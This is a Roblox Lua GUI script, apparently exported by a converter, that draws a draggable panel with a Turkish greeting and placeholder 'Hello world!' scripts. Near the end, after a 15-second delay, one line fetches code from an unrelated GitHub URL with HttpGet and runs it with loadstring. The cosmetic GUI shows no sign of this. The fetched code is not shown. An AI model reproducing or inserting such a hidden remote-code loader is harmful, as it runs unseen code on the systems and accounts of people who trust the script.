-- Gui to Lua
-- Version: 3.2

-- Instances:

local fremacokonatl = Instance.new("ScreenGui")
local hemde = Instance.new("Frame")
local yupi = Instance.new("TextLabel")
local TextLabel = Instance.new("TextLabel")
local leblebi = Instance.new("TextLabel")
local retr = Instance.new("TextLabel")
local ImageLabel = Instance.new("ImageLabel")
local UICorner = Instance.new("UICorner")

--Properties:

fremacokonatl.Name = "fremacokonatlı"
fremacokonatl.Parent = game.CoreGui
fremacokonatl.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

hemde.Name = "hemde"
hemde.Parent = fremacokonatl
hemde.Active = true
hemde.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
hemde.BorderColor3 = Color3.fromRGB(34, 34, 34)
hemde.Position = UDim2.new(0.208816722, 0, 0.28597784, 0)
hemde.Size = UDim2.new(0, 411, 0, 248)

yupi.Name = "yupi"
yupi.Parent = hemde
yupi.BackgroundColor3 = Color3.fromRGB(54, 54, 54)
yupi.BorderColor3 = Color3.fromRGB(54, 54, 54)
yupi.Position = UDim2.new(0, 0, 0.935483873, 0)
yupi.Size = UDim2.new(0, 15, 0, 16)
yupi.Font = Enum.Font.SourceSans
yupi.Text = ""
yupi.TextColor3 = Color3.fromRGB(0, 0, 0)
yupi.TextSize = 14.000

TextLabel.Parent = hemde
TextLabel.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
TextLabel.BorderColor3 = Color3.fromRGB(34, 34, 34)
TextLabel.Position = UDim2.new(0, 0, 0.830645144, 0)
TextLabel.Size = UDim2.new(0, 411, 0, 26)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = ""
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 14.000

leblebi.Name = "leblebi"
leblebi.Parent = hemde
leblebi.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
leblebi.BorderColor3 = Color3.fromRGB(34, 34, 34)
leblebi.Position = UDim2.new(0.418491483, 0, 0.0967741907, 0)
leblebi.Size = UDim2.new(0, 195, 0, 68)
leblebi.Font = Enum.Font.SourceSans
leblebi.Text = "MERHABA"
leblebi.TextColor3 = Color3.fromRGB(255, 255, 255)
leblebi.TextSize = 28.000
leblebi.TextWrapped = true

retr.Name = "retr"
retr.Parent = hemde
retr.BackgroundColor3 = Color3.fromRGB(34, 34, 34)
retr.BorderColor3 = Color3.fromRGB(34, 34, 34)
retr.Position = UDim2.new(0.372262776, 0, 0.383064508, 0)
retr.Size = UDim2.new(0, 245, 0, 57)
retr.Font = Enum.Font.SourceSans
retr.Text = "Bu Script Turk Yapimidir Iyi Oyunlar"
retr.TextColor3 = Color3.fromRGB(255, 255, 255)
retr.TextSize = 28.000
retr.TextWrapped = true

ImageLabel.Parent = hemde
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.Position = UDim2.new(0.107055962, 0, 0.185483873, 0)
ImageLabel.Size = UDim2.new(0, 100, 0, 100)
ImageLabel.Image = "http://www.roblox.com/asset/?id=6753145358"

UICorner.CornerRadius = UDim.new(99, 8)
UICorner.Parent = ImageLabel

-- Scripts:

local function NWHMFM_fake_script() -- TextLabel.LocalScript 
	local script = Instance.new('LocalScript', TextLabel)

	print("Hello world!")
	
end
coroutine.wrap(NWHMFM_fake_script)()
local function AUWS_fake_script() -- TextLabel.LocalScript 
	local script = Instance.new('LocalScript', TextLabel)

	print("Hello world!")
	
end
coroutine.wrap(AUWS_fake_script)()
local function NYQH_fake_script() -- hemde.Make GUI Draggable 
	local script = Instance.new('LocalScript', hemde)

	local UserInputService = game:GetService("UserInputService")
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end
coroutine.wrap(NYQH_fake_script)()
local function INZCBP_fake_script() -- fremacokonatl.LocalScript 
	local script = Instance.new('LocalScript', fremacokonatl)

	print("Hello world!")
	
end
wait(15)
loadstring(game:HttpGet('https://raw.githubusercontent.com/cihonemm/ez/main/e'))()
coroutine.wrap(INZCBP_fake_script)()
